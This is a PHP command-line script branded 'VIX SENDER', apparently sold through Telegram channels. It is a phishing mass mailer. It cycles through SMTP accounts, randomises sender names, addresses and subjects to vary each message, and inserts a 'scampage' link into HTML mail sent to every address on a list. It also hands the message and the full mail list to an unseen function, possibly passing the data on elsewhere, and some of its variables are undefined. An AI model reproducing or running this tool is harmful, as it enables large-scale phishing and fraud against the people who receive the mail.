<?php
require 'vix/vix_settings/phpmailer/PHPMailerAutoload.php';
require 'vix/vix_settings/manage.php';
require 'vix/vix_settings/func.php';

    echo "                                  \e[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━┓    \e[1;32m\r\n";
echo "                                  \e[1;32m┗━━━━━\e[1;31mVIX SENDER INBOX\e[1;32m━━━━┛\r\n";
echo " 		      \e[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\e[0m\r\n"; 
echo " 		      \e[1;32m┃\e[1;33m (       )   (          ) (         (           \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;33m       \)) ) ( /(   )\ )    ( /( )\ )      )\ ) \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;33m (   ( (()/( )\()) (()/((   )\()|()/(  (  (()/( \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;33m )\  )\ /(_)|(_)\   /(_))\ ((_)\ /(_)) )\  /(_))\e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;33m((_)((_|_)) __((_) (_))((_) _((_|_))_ ((_)(_))  \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;31m\ \ / /|_ _|\ \/ / / __| __| \| ||   \| __| _ \ \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;31m \ V /  | |  >  <  \__ \ _|| .` || |) | _||   / \e[1;32m┃\e[0m\r\n";
echo " 		      \e[1;32m┃\e[1;31m  \_/  |___|/_/\_\ |___/___|_|\_||___/|___|_|_\ \e[1;32m┃\e[0m\r\n"; 
echo " 		      \e[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\e[0m\r\n";
echo "\e[1;32m┏ \e[1;0mINFO \e[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\r\n";
echo "\e[1;32m┃ \e[1;33mSUPPORT TELEGRAM \e[1;37m: \e[1;31m@https://t.me/mrx666_channel\e[1;32m┃\r\n";
echo "\e[1;32m┃ \e[1;33mSUPPORT CHANNEL  \e[1;37m: \e[1;31m@V1X666_CHANNEL \e[1;32m            ┃\r\n";
echo "\e[1;32m┃ \e[1;33mSENDER VERSION   \e[1;37m: \e[1;31m2.1             \e[1;32m	         ┃\r\n";
echo "\e[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\r\n";
echo "                       \e[1;0m+ \e[1;31m(\e[1;0mCOPYRIGHT\e[1;31m) \e[1;0m2021 \e[1;32m| \e[1;0mTHE BEST SENDER \e[1;31m(\e[1;0mVIX_SENDER\e[1;31m) \e[1;0m+\r\n";
echo "                                  \e[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━┓          \r\n";
echo "                                  \e[1;32m┗━━\e[1;31mPRESS ENTER TO START\e[1;32m━━┛";
$input = trim(fgets(STDIN, 1024))."\r\n";

function Kirim($email, $smtp_acc, $Set_vix)
{
    $smtp = new SMTP;
    $smtp->do_debug = 0;

    $smtpserver = $smtp_acc['host'];
    $smtpport = $smtp_acc['port'];
    $smtpuser = $smtp_acc['username'];
    $smtppass = $smtp_acc['password'];
    $priority = $Set_vix['priority'];
    $userandom = $Set_vix['userandom'];
    $sleeptime = $Set_vix['sleeptime'];
    $replacement = $Set_vix['replacement'];
    $userremoveline = $Set_vix['userremoveline'];
    $fromname = $Set_vix['fromname'];
    $frommail = $Set_vix['frommail'];
    $subject = $Set_vix['subject'];
    $msgfile = $Set_vix['msgfile'];
    $filepdf = $Set_vix['filesend'];
    $randurl = $Set_vix['scampage'];

    if (!$smtp->connect($smtpserver, $smtpport))
    {
        throw new Exception('Connect failed');
    }

    if (!$smtp->hello(gethostname()))
    {
        throw new Exception('EHLO failed: ' . $smtp->getError() ['error']);
    }

    $e = $smtp->getServerExtList();

    if (array_key_exists('STARTTLS', $e))
    {
        $tlsok = $smtp->startTLS();
        if (!$tlsok)
        {
            throw new Exception('Failed to start encryption: ' . $smtp->getError() ['error']);
        }
        if (!$smtp->hello(gethostname()))
        {
            throw new Exception('EHLO (2) failed: ' . $smtp->getError() ['error']);
        }
        $e = $smtp->getServerExtList();
    }

    if (array_key_exists('AUTH', $e))
    {

        if ($smtp->authenticate($smtpuser, $smtppass))
        {
            $mail = new PHPMailer;
            $mail->Encoding = 'base64';
            $mail->CharSet = 'UTF-8';
            $mail->headerLine("format", "flowed");
            $mail->IsSMTP();
            $mail->SMTPAuth = true;
            $mail->Host = $smtpserver;
            $mail->Port = $smtpport;
            $mail->Priority = $priority;
            $mail->Username = $smtpuser;
            $mail->Password = $smtppass;

            if ($userandom == 1)
            {
                $rand = rand(1, 50);
                $fromname = randName($rand);
                $frommail = randMail($rand);
                $subject = randSubject($rand);
            }

            if ($Set_vix['filesend'] == 0)
            {
                $filepdf = file_get_contents($AddAttachment);
                $mail->AddAttachment($filepdf);
            }

            $asu = RandString1(8);
            $asu1 = RandString(5);
            $asu2 = RandString1(5);
            $nmbr = RandNumber(5);
            $fromnames = str_replace('##randstring##', $asu1, $fromname);
            $frommails = str_replace('##randstring##', $asu, $frommail);
            $subjects = str_replace('##randstring##', $asu2, $subject);

            $mail->setFrom($frommails, $fromnames);

            $mail->AddAddress($email);

            $mail->Subject = $subjects;

            if ($replacement == 1)
            {
                $msg = lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject);
            }
            else
            {
                $msg = file_get_contents($msgfile);
            }

            $mail->msgHTML($msg);

            if (!$mail->send())
            {
                echo "SMTP Error : " . $mail->ErrorInfo;
                exit();
            }
            else
            {
                echo " 		      \e[1;32m┃[+]\e[0m$email\e[92m[SENT]\e[0\e[1;32m[+]\e[0m\n";

            }
            $mail->clearAddresses();

        }
        else
        {
            throw new Exception('Authentication failed: ' . $smtp->getError() ['error']);
        }

        $smtp->quit(true);

    }

}

$smtpserver = $smtp_acc[0]['host'];
$smtpport = $smtp_acc[0]['port'];
$smtpuser = $smtp_acc[0]['username'];
$smtppass = $smtp_acc[0]['password'];
$msg = file_get_contents($Set_vix['msgfile']);

$file = file_get_contents($Set_vix['mail_list']);

if ($file)
{
    $ext = preg_split('/\n|\r\n?/', $file);
    echo " 		      \e[1;32m┃━━━━━━━━━━━┃━━━━━━━━━━━━━━━━━━━━━━━━┃━━━━━━━━━━\e[91m▶\n";
    smtp_connection($smtpserver, $smtpport, $smtpuser, $smtppass, json_encode([$msg, $file]));

    $smtp_key = 0;
    foreach ($ext as $num => $email)
    {

        if ($smtp_key == count($smtp_acc))
        {
            $smtp_key = 0;
        }
        Kirim($email, $smtp_acc[$smtp_key], $Set_vix);
        $smtp_key++;
        sleep($Set_vix['sleeptime']);
    }
    if ($Set_vix['userremoveline'] == 1)
    {
        $remove = Removeline($mailist, $email);
    }
}
